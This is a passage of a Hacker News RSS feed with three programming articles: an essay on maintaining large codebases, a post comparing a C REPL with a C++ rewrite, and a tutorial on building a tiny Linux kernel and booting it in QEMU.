<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 16 Feb 2021 12:39:32 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 16 Feb 2021 12:39:32 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[On Navigating a Large Codebase]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 49 (<a href="https://news.ycombinator.com/item?id=26129190">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago, I’ve been working on a very large codebase that consisted of a few million lines of code.
Large systems are usually a big mess and this one was no exception.
Since this is a rather common problem in software engineering, I thought the internet would be
littered with stories about this topic.
There is a lot of talk about software carpentry, while software maintenance is rarely debated.
Either large programs are being maintained by dark matter developers or
nobody thinks that writing stories about large systems are interesting enough.</p><p>In the past I’ve encountered a few of those large monsters and they seem to have a lot in common.
This article will try to present some of the problems and tricks that I am using when
I have to deal with them. Hopefully this will inspire others to write similar posts
and share tips from their own bag of tricks.</p><h2 id="large-codebase-problems">Large codebase problems</h2><p>The main problem of any large codebase is the extreme complexity that stems from the fact
that we live in a messy world of details that are very hard to describe and put into words.
The programming languages that we are using nowadays are still too primitive for that task,
and it takes a lot of lines and various layers of abstractions before we are able to convey the
rules of our world to the all mighty computer [1].</p><p>The following sections will present some of the common problems which I’ve discovered during my
big system adventures.</p><p>A common trait of a large codebases is that at some point they become so large and bloated
that one person alone is no longer capable of understanding all its pieces. It seems to
me that after 100’000 lines of code, the maintenance related problems start to appear
as the complexity of the code simply dwarfs the capabilities of the human brain.
Such large systems are commonly maintained by more than one person, but with a large
group of people also come large organizational problems.</p><p>Within a large group of people the number of possible communication paths between them go bananas
and so it often happens that the ass no longer knows what the head is doing.
This misunderstanding in turn cause them to build the wrong thing that doesn’t fit
into the rest of the system. You might also know this situation under the term of
“those people had no idea what they were doing, and we will do it right this time” which is
quite often floating around in the latest maintenance team.</p><p>That rarely happens though, because it’s likely the Towel of Babel situation all over again.</p><h3 id="loss-of-knowledge">Loss of knowledge</h3><p>Large systems are usually maintained by the ones who did not build them. Initial
developers often leave the company or move up in the pecking order to
work on other projects and are therefore no longer familiar with the system.
Sometimes the bright minds outsourced the initial development of the project
in the name of lowering the costs, just to pay tenfold in the later stages once they realize
the outsourcers developed the wrong thing. Even worse is the fact that the in house developers
didn’t gain the internal domain knowledge that is necessary for further maintenance of the system.</p><p>This presents a big problem for the new maintainers, as they can’t just go
around the company and ask the original developers about the initial design decisions.
Learning this tribal knowledge usually takes a lot of time, because the code is harder to read and
understand than it is to write. These days most developers seem to switch jobs every 2 to 3 years,
therefore the learning process has to be constantly going on, otherwise you might end up
with a large and expensive monster that nobody knows anything about [2].
For most of the past large projects on which I’ve been working on, the team has usually
changed by the end of the first version.</p><p>Rigorously documenting every step is not the cure for this problem, because at some point all that
junk will become outdated and nobody will have the time to spend a year just reading the
documentation and figuring out how the pieces fit together [3].</p><h3 id="lack-of-knowledge">Lack of knowledge</h3><p>Large systems become large, because they are usually trying to solve every problem under the sun.
Often the organization that is embarking on such journey does not have enough experienced
employees on board to actually pull it off. Some like to say that pressure makes diamonds,
but sometimes it also crushes the things that are under.</p><p>It’s fine to have less experienced people working on a large system as long as they have the elders
overseeing their work. In the world where senior titles are handed left and right,
that is often not the case and it’s how you end up with a very fragile system that is suitable for
a replacement as soon as it was built. Most of the larger projects that I was working on and
were considered successes, had the core parts of the system written by experienced
developers. A significant chunks were also built by greenhorns, but they were usually
guided and their blast radius was limited to the less complex parts of the system.</p><h3 id="the-astronauts">The astronauts</h3><p>Big projects tend to attract the data modelers and other cultists who like to
get in the way of getting shit done. These architecture astronauts will endlessly
discuss the finer points of their UML data models and multithreaded layers of abstraction,
that will one day allow them to be the heroes of their own story by writing some well
encapsulated and “SOLID” code.</p><blockquote><p>Why IBM sales reps don’t have children?</p><p>Because all they do is sit on the bed telling their spouses how great it’s going to be.</p></blockquote><p>Meanwhile, the for loopers have to fight this creeping metadata bureaucracy
madness on a daily basis. The tools handed down to them from the ivory tower usually don’t stand
the heat of the battle, but that doesn’t bother the modelers who will try to fix
the problems with more obfuscation patterns. It’s how you end with a homebrewed middleware monstrosity,
because the 100 existing ones out there are obviously not up to the task of powering our little CRUD app.</p><h3 id="documentation-problems">Documentation problems</h3><blockquote><p>I like to keep documentation separated from the code. Who am I?</p><p>A fool, with an out of sync document.</p></blockquote><p>The documentation of any large system is almost always outdated.
The code is usually changing faster due to the endless edge cases of the system
that were not being thought of early on. The discovered edge case problems are
usually fixed by bolting additional functionality right on the spot.
The average code change of such patch is usually quite small,
but a few tweaks here and there accumulate over time until the original design no
longer matches with the reality.</p><p>Tweaking the code is usually simple as most people are familiar with the process. You pull the
code from the version control, you make your tweaks and then you push it back.
On the other hand updating the documentation is way more convoluted and usually involves the
whole ceremony, because the term documentation is actually a spaghetti of Word documents,
pdfs, spreadsheets, emails, wiki pages and some text files on some dude’s hard drive.</p><p>The corporate world still loves to use MS Word for writing technical documents, even though
it’s entirely unusable for this use case. The Word doesn’t support syntax highlighting for
code snippets and you get to play the game of “moving one image for 5 pixels to the
left will mess with your headings and right align all text.”
It also makes it very hard to have multiple people collaborating on the same document.
The version control still treats Word documents in the same way as binary blobs,
which makes merging changes and fixing merge conflicts far harder than it should be.
I still remember how people collaborated by working each on their own copy of the
document and having a documentation officer merging all the copies together
manually to avoid any merge conflicts. Fun times.</p><p>If you are lucky, you might be writing documentation in plain text, but then you may have to
get familiar with all kinds of weird Lovecraftian toolchains that are relying on
all sorts of ancient operating system specifics in order to produce a nicer looking document.</p><p>After all these years of progress, writing documentation is still an unpleasant process
due to all the pain surrounding the tools that we have to deal with on a daily basis.
Large projects ensure that not only is the documentation hard to write, it’s also
impossible to find and read due to the sheer number of documents [4].</p><h2 id="tackling-the-beast">Tackling the beast</h2><p>In this section I will describe my ways of tackling the problems of an unknown large codebase
that I often encounter in the wild.
As mentioned before, the main problem of large systems is that nobody can understand them
entirely and often you will be left wondering how the damn thing even works.</p><p>When you are trying to understand a specific part of a large system, it’s worth
taking the time to talk to the current maintainers. They usually know it well enough
to guide you through the jungle, so you can avoid the traps and get up to speed faster.
Sometimes you will encounter a situation where you will just have to figure it
out on your own, because nobody will have the answers to your questions.</p><p>Hopefully the following sections might give you some ideas on how to tackle such
situations.</p><h3 id="read-the-documentation">Read the documentation</h3><p>The easiest way to get familiar with a large system, is by going through its documentation and
actually reading it. Large systems usually contain
large swaths of outdated documentation, but even a slightly outdated document is
often better than not having it at all. Ask the elders about the current state of documentation,
so you don’t completely waste your time with deciphering the irrelevant documents.</p><p>Either way, the documentation will only give you an overview of the system. The details
behind design decisions are almost never mentioned and you will have to find another way.</p><h3 id="check-the-tests">Check the tests</h3><p>When I am trying to decipher how a specific part of the system is supposed to behave,
I usually check for tests. If they exist, you might want to scroll through them and hopefully
you will get another …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129190</guid>
            <pubDate>Sun, 14 Feb 2021 02:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Setting up a Better REPL]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26129179">thread link</a>) | @downvotemore
<br/>
February 13, 2021 | https://mikeloomisgg.github.io/2019-04-10-set-up-repl/ | <a href="https://web.archive.org/web/*/https://mikeloomisgg.github.io/2019-04-10-set-up-repl/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-set-up-repl" class="page" role="article"><header><p> <time datetime="2019-04-10T00:00:00+00:00">10 Apr 2019</time> on <a href="https://mikeloomisgg.github.io/tag/cpp/">c++</a>, <a href="https://mikeloomisgg.github.io/tag/database/">Databases</a></p></header><p>One of the very common criticisms of c++ is that it is very complicated. I saw someone on a programming stream yesterday claim that they prefer raw c because it feels more <em>intuitive</em>. To me, this just seems out of touch with reality. Lets look at the simplest REPL, from <a href="https://cstack.github.io/db_tutorial/parts/part1.html">part 1</a> of the cstack database from scratch series. I think by the end anyone would agree with me that the c++ version of this code is better in every way to its c counterpart.</p><p>What we are creating here, REPL for short, is a very common introductory tool for someone just getting used to working with a SQL database. It allows a beginner user to interact with the database line by line, discovering how SQL works through tinkering with the language. Many of these REPL shells are also used in scripting languages, and its the default mode that python starts in if you pass it no arguments.</p><p>In this part, we are just looking at the simplest REPL ever, which just prompts the user with some context in the terminal, and allows lines of input to be evaluated. The only command we are evaluating for now is just the SQL .exit metacommand. Any other commands passed to our program are unrecognized. Here is the c version:</p><div><div><pre><code><span>#include &lt;stdbool.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span>struct</span> <span>InputBuffer_t</span> <span>{</span>
  <span>char</span><span>*</span> <span>buffer</span><span>;</span>
  <span>size_t</span> <span>buffer_length</span><span>;</span>
  <span>ssize_t</span> <span>input_length</span><span>;</span>
<span>};</span>
<span>typedef</span> <span>struct</span> <span>InputBuffer_t</span> <span>InputBuffer</span><span>;</span>

<span>InputBuffer</span><span>*</span> <span>new_input_buffer</span><span>()</span> <span>{</span>
  <span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>InputBuffer</span><span>));</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer_length</span> <span>=</span> <span>0</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>input_length</span> <span>=</span> <span>0</span><span>;</span>

  <span>return</span> <span>input_buffer</span><span>;</span>
<span>}</span>

<span>void</span> <span>print_prompt</span><span>()</span> <span>{</span> <span>printf</span><span>(</span><span>"db &gt; "</span><span>);</span> <span>}</span>

<span>void</span> <span>read_input</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
  <span>ssize_t</span> <span>bytes_read</span> <span>=</span>
      <span>getline</span><span>(</span><span>&amp;</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>),</span> <span>&amp;</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer_length</span><span>),</span> <span>stdin</span><span>);</span>

  <span>if</span> <span>(</span><span>bytes_read</span> <span>&lt;=</span> <span>0</span><span>)</span> <span>{</span>
    <span>printf</span><span>(</span><span>"Error reading input</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>// Ignore trailing newline
</span>  <span>input_buffer</span><span>-&gt;</span><span>input_length</span> <span>=</span> <span>bytes_read</span> <span>-</span> <span>1</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>[</span><span>bytes_read</span> <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>0</span><span>;</span>
<span>}</span>

<span>void</span> <span>close_input_buffer</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>);</span>
<span>}</span>

<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>*</span> <span>argv</span><span>[])</span> <span>{</span>
  <span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>new_input_buffer</span><span>();</span>
  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>print_prompt</span><span>();</span>
    <span>read_input</span><span>(</span><span>input_buffer</span><span>);</span>

    <span>if</span> <span>(</span><span>strcmp</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>,</span> <span>".exit"</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
      <span>close_input_buffer</span><span>(</span><span>input_buffer</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>printf</span><span>(</span><span>"Unrecognized command '%s'.</span><span>\n</span><span>"</span><span>,</span> <span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div><p>Here’s a whole mess of things that a modern Rust or C++ developer cringe at.</p><ul><li>Using malloc to allocate memory for an input buffer</li><li>Using a strcmp free function to deep compare equality of raw buffers.</li><li>Manually freeing the memory allocated for the input buffer after we’re done.</li></ul><p>This isn’t fast, and it isn’t intuitive. Its also 56 lines of code with a large amount of boilerplate code for handling memory allocation.</p><p>Lets break this down into a much simpler and more intuitive c++ alternative step by step.</p><div><div><pre><code><span>//Replace this input buffer pointer with a std::string
</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>new_input_buffer</span><span>();</span>
</code></pre></div></div><div><div><pre><code><span>// Our single line prompt function doesn't need to call an external free function
// Get rid of the free function 
</span><span>void</span> <span>print_prompt</span><span>()</span> <span>{</span> <span>printf</span><span>(</span><span>"db &gt; "</span><span>);</span> <span>}</span>
</code></pre></div></div><div><div><pre><code><span>/// strcmp is unnecessary if we're using the std::string type which has overloaded the == operator for string literals
</span><span>if</span> <span>(</span><span>strcmp</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>,</span> <span>".exit"</span><span>)</span> <span>==</span> <span>0</span><span>)</span>
</code></pre></div></div><div><div><pre><code><span>// malloc and free are code smells. Like new and delete, they should not exist in modern c++ code.
</span><span>void</span> <span>close_input_buffer</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>);</span>
<span>}</span>
</code></pre></div></div><p>Here is our nearly identical c++ version with those simplifications:</p><div><div><pre><code><span>#include &lt;iostream&gt;
#include &lt;string&gt;
</span>
<span>int</span> <span>main</span><span>()</span> <span>{</span>
  <span>std</span><span>::</span><span>string</span> <span>input</span><span>;</span>
  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"db &gt; "</span><span>;</span>
    <span>std</span><span>::</span><span>getline</span><span>(</span><span>std</span><span>::</span><span>cin</span><span>,</span> <span>input</span><span>);</span>

    <span>if</span><span>(</span><span>input</span> <span>==</span> <span>".exit"</span><span>)</span> <span>{</span>
      <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Unrecognized command: "</span> <span>&lt;&lt;</span> <span>input</span> <span>&lt;&lt;</span> <span>'\n'</span><span>;</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div><p>Compare the two different versions’ disassembly on a website like https://godbolt.org/ and we can see that the c++ version very similar and potentially faster than the raw c version.</p><table><thead><tr><th>&nbsp;</th><th>c</th><th>c++</th></tr></thead><tbody><tr><td>Lines of code</td><td>56</td><td>15</td></tr><tr><td>Disassembly length</td><td>99</td><td>99</td></tr><tr><td>Potential bugs</td><td>Infinite chances of memory leaks</td><td>Impossible to leak with RAII types on the stack</td></tr></tbody></table><p>This very simple REPL for part 1 perfectly illustrates how insane people sound to me when they claim that c is simpler or more intuitive than c++. In this simple case, c++ is approximately as easy to write and understand as a high level scripting language like python, but compiles down to a smaller binary than c.</p><p>This post is part of a series which I am going to go through step by step simplifying and converting the cstack sqlite database into a more modern c++ version. So stay tuned for the next parts where we’ll discuss:</p><ul><li>Better REPL parser implementations</li><li>Test Driven Developement in Practice</li><li>Database structure and persistence</li><li>A look at B-Trees</li></ul></article></div>]]>
            </description>
            <link>https://mikeloomisgg.github.io/2019-04-10-set-up-repl/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129179</guid>
            <pubDate>Sun, 14 Feb 2021 02:37:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Tiny Linux Kernel]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26129094">thread link</a>) | @mmphosis
<br/>
February 13, 2021 | https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d | <a href="https://web.archive.org/web/*/https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><div><a href="https://medium.com/@anuradha?source=post_page-----8c07579ae79d--------------------------------" rel="noopener"><div><p><img alt="Anuradha Weeraman" src="https://miro.medium.com/fit/c/96/96/1*Lmj25yY1HRAVGeWBkpWIWQ.jpeg" width="48" height="48"></p></div></a></div></div></div></div></div><p id="270a">Today we will go over the process of building a tiny Linux kernel, and booting into a shell. To start with, fetch the Linux source tree that you’d like to try this out on. I’m using staging tree for this post. You can get it here:</p><pre><span id="fd32">$ git clone git://git.kernel.org/pub/scm/linux/kernel/git/gregkh/staging.git</span></pre><p id="2ba7">To get an initial config that’s very minimalist:</p><pre><span id="8a0c">$ make tinyconfig</span></pre><p id="6abf">Here’s a comparison of the config options enabled by tinyconfig to a stock kernel that come with my Debian distribution:</p><pre><span id="79de">$ grep "=y" .config | wc -l<br>247<br>$ grep "=m" .config | wc -l<br>0<br>$ grep "=y" /boot/config-5.4.0-4-amd64 | wc -l<br>2071<br>$ grep "=m" /boot/config-5.4.0-4-amd64 | wc -l<br>3401</span></pre><p id="0903">Let’s try to build it:</p><pre><span id="b16b">$ time make -j16<br>scripts/kconfig/conf  --syncconfig Kconfig<br>  SYSTBL  arch/x86/include/generated/asm/syscalls_32.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_32.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_64.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_x32.h<br>  WRAP    arch/x86/include/generated/uapi/asm/bpf_perf_event.h<br>.<br>.<br>.<br>.<br>Setup is 13788 bytes (padded to 13824 bytes).<br>System is 417 kB<br>CRC 435fb428<br>Kernel: arch/x86/boot/bzImage is ready  (#1)</span><span id="b15f">real 0m15.468s<br>user 2m12.094s<br>sys 0m14.603s</span></pre><p id="3536">The kernel builds to around ~430k. This is a 32-bit kernel by default, so let’s enable 64-bit support:</p><pre><span id="3ec0">$ make menuconfig</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3790/1*Qqz6S1F0iuHYvkh3La7L7Q.png" width="1895" height="1006" srcset="https://miro.medium.com/max/552/1*Qqz6S1F0iuHYvkh3La7L7Q.png 276w, https://miro.medium.com/max/1104/1*Qqz6S1F0iuHYvkh3La7L7Q.png 552w, https://miro.medium.com/max/1280/1*Qqz6S1F0iuHYvkh3La7L7Q.png 640w, https://miro.medium.com/max/1400/1*Qqz6S1F0iuHYvkh3La7L7Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*Qqz6S1F0iuHYvkh3La7L7Q.png?q=20"></p></div></div></div></figure><p id="94ce">Enable the TTY for console support:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3800/1*98FOepVg-qylMCy2fTBx0Q.png" width="1900" height="1007" srcset="https://miro.medium.com/max/552/1*98FOepVg-qylMCy2fTBx0Q.png 276w, https://miro.medium.com/max/1104/1*98FOepVg-qylMCy2fTBx0Q.png 552w, https://miro.medium.com/max/1280/1*98FOepVg-qylMCy2fTBx0Q.png 640w, https://miro.medium.com/max/1400/1*98FOepVg-qylMCy2fTBx0Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*98FOepVg-qylMCy2fTBx0Q.png?q=20"></p></div></div></div></figure><p id="8c6a">and support for printk to see console output as the kernel boots:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3796/1*fKls0hD5lYLYd579TRKgKQ.png" width="1898" height="1010" srcset="https://miro.medium.com/max/552/1*fKls0hD5lYLYd579TRKgKQ.png 276w, https://miro.medium.com/max/1104/1*fKls0hD5lYLYd579TRKgKQ.png 552w, https://miro.medium.com/max/1280/1*fKls0hD5lYLYd579TRKgKQ.png 640w, https://miro.medium.com/max/1400/1*fKls0hD5lYLYd579TRKgKQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*fKls0hD5lYLYd579TRKgKQ.png?q=20"></p></div></div></div></figure><p id="9a2e">Build again:</p><pre><span id="f1eb">Setup is 13596 bytes (padded to 13824 bytes).<br>System is 737 kB<br>CRC d273f4d<br>Kernel: arch/x86/boot/bzImage is ready  (#4)</span><span id="1a1b">real 0m6.045s<br>user 0m40.808s<br>sys 0m3.958s</span></pre><p id="371e">The size has gone up somewhat, nearly double what we started off with. If you’re only supporting a serial interface, even this additional bloat can be avoided to keep the size of the image down.</p><p id="ea7f">Boot the kernel with qemu:</p><pre><span id="6b5b">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*QfIoYrTIpWEIBD0ZETpx4w.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*QfIoYrTIpWEIBD0ZETpx4w.png 276w, https://miro.medium.com/max/1104/1*QfIoYrTIpWEIBD0ZETpx4w.png 552w, https://miro.medium.com/max/1280/1*QfIoYrTIpWEIBD0ZETpx4w.png 640w, https://miro.medium.com/max/1400/1*QfIoYrTIpWEIBD0ZETpx4w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*QfIoYrTIpWEIBD0ZETpx4w.png?q=20"></p></div></div></div></figure><p id="0ef2">The kernel boots and panics when attempting to start init, as expected. In order to boot into a shell as we originally set out to do, we will need a filesystem and a shell that can be started by the kernel as PID 1. Let us create a bare bones ram disk image that we can use to boot into a minimal busybox shell.</p><p id="259d">There are plenty of ways to achieve this, and here’s just one way:</p><pre><span id="6e90">$ git clone <a href="mailto:git@github.com" rel="noopener">git@github.com</a>:aweeraman/kernel-utils.git<br>$ kernel-utils/create-initrd.sh <br>Creating initrd filesystem... ok<br>Building dependencies... <br>Cloning into 'busybox'...<br>remote: Enumerating objects: 29, done.<br>remote: Counting objects: 100% (29/29), done.<br>remote: Compressing objects: 100% (23/23), done.<br>remote: Total 110424 (delta 16), reused 14 (delta 6), pack-reused 110395<br>Receiving objects: 100% (110424/110424), 37.05 MiB | 5.40 MiB/s, done.<br>Resolving deltas: 100% (87061/87061), done.<br>Building initrd... 4882 blocks</span></pre><p id="d743">Before we can use this ram disk, we need to enable init RAM disk (initrd) support in the kernel:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3802/1*pBLJG65lMbzCEhUxfdyhzQ.png" width="1901" height="1009" srcset="https://miro.medium.com/max/552/1*pBLJG65lMbzCEhUxfdyhzQ.png 276w, https://miro.medium.com/max/1104/1*pBLJG65lMbzCEhUxfdyhzQ.png 552w, https://miro.medium.com/max/1280/1*pBLJG65lMbzCEhUxfdyhzQ.png 640w, https://miro.medium.com/max/1400/1*pBLJG65lMbzCEhUxfdyhzQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*pBLJG65lMbzCEhUxfdyhzQ.png?q=20"></p></div></div></div></figure><p id="0abf">I have only included support for gzip compression and disabled the rest.</p><p id="ca12">We will also need to enable ELF-support to be able to start up the shell:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3792/1*ul_vqh5YRC4YP7j0QRKuWA.png" width="1896" height="1009" srcset="https://miro.medium.com/max/552/1*ul_vqh5YRC4YP7j0QRKuWA.png 276w, https://miro.medium.com/max/1104/1*ul_vqh5YRC4YP7j0QRKuWA.png 552w, https://miro.medium.com/max/1280/1*ul_vqh5YRC4YP7j0QRKuWA.png 640w, https://miro.medium.com/max/1400/1*ul_vqh5YRC4YP7j0QRKuWA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ul_vqh5YRC4YP7j0QRKuWA.png?q=20"></p></div></div></div></figure><p id="1395">This time, when booting the kernel, pass in the -initrd argument and specify the initrd image that we created earlier, in addition to an argument to the kernel to specify the binary that it should look for in the ram disk and execute once the kernel has finished booting, which is in this case is ‘/bin/sh’.</p><pre><span id="fee5">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd kernel-utils/initramfs.cpio.gz -append "init=/bin/sh"</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*0a_JKjSCmrnPPp4cXeu6Qg.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*0a_JKjSCmrnPPp4cXeu6Qg.png 276w, https://miro.medium.com/max/1104/1*0a_JKjSCmrnPPp4cXeu6Qg.png 552w, https://miro.medium.com/max/1280/1*0a_JKjSCmrnPPp4cXeu6Qg.png 640w, https://miro.medium.com/max/1400/1*0a_JKjSCmrnPPp4cXeu6Qg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*0a_JKjSCmrnPPp4cXeu6Qg.png?q=20"></p></div></div></div></figure><p id="8c0d">And we have a shell.</p><p id="2c42">Let’s enable the /proc filesystem so we can run some standard commands:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3788/1*xEFVIfD0rrdra5ox2z86mA.png" width="1894" height="1008" srcset="https://miro.medium.com/max/552/1*xEFVIfD0rrdra5ox2z86mA.png 276w, https://miro.medium.com/max/1104/1*xEFVIfD0rrdra5ox2z86mA.png 552w, https://miro.medium.com/max/1280/1*xEFVIfD0rrdra5ox2z86mA.png 640w, https://miro.medium.com/max/1400/1*xEFVIfD0rrdra5ox2z86mA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*xEFVIfD0rrdra5ox2z86mA.png?q=20"></p></div></div></div></figure><p id="9333">Mount the proc file system after booting, so you can use commands like ‘ps’ and ‘free’:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*lB3Pk16_27Xd402yxPnNdw.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*lB3Pk16_27Xd402yxPnNdw.png 276w, https://miro.medium.com/max/1104/1*lB3Pk16_27Xd402yxPnNdw.png 552w, https://miro.medium.com/max/1280/1*lB3Pk16_27Xd402yxPnNdw.png 640w, https://miro.medium.com/max/1400/1*lB3Pk16_27Xd402yxPnNdw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*lB3Pk16_27Xd402yxPnNdw.png?q=20"></p></div></div></div></figure><p id="6e5c">Here’s the size of the kernel that we just built:</p><pre><span id="a064">Setup is 13788 bytes (padded to 13824 bytes).<br>System is 793 kB</span></pre><p id="de47">Note that this is the size of the compressed kernel on disk and the actual memory used at boot time is comparable to the size of the generated vmlinux file, which in this case is 12MB. You would need at least that much memory to load the kernel into memory, plus 8–16MB additionally for the user space. Here’s the minimum memory configuration that allowed me to boot this kernel in qemu:</p><pre><span id="483d">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd kernel-utils/initramfs.cpio.gz -append "init=/bin/sh" -m 29M</span></pre><p id="625a">Just for kicks, I disabled printk and booted up the kernel, that put me into a shell almost immediately:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*qRFHRgS6qYUoV2GqJhTjUA.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*qRFHRgS6qYUoV2GqJhTjUA.png 276w, https://miro.medium.com/max/1104/1*qRFHRgS6qYUoV2GqJhTjUA.png 552w, https://miro.medium.com/max/1280/1*qRFHRgS6qYUoV2GqJhTjUA.png 640w, https://miro.medium.com/max/1400/1*qRFHRgS6qYUoV2GqJhTjUA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*qRFHRgS6qYUoV2GqJhTjUA.png?q=20"></p></div></div></div></figure><p id="c8b4">Finally, the compressed kernel size comes down to:</p><pre><span id="d1b9">Setup is 13788 bytes (padded to 13824 bytes).<br>System is 749 kB</span></pre></div></div></section></div></div>]]>
            </description>
            <link>https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129094</guid>
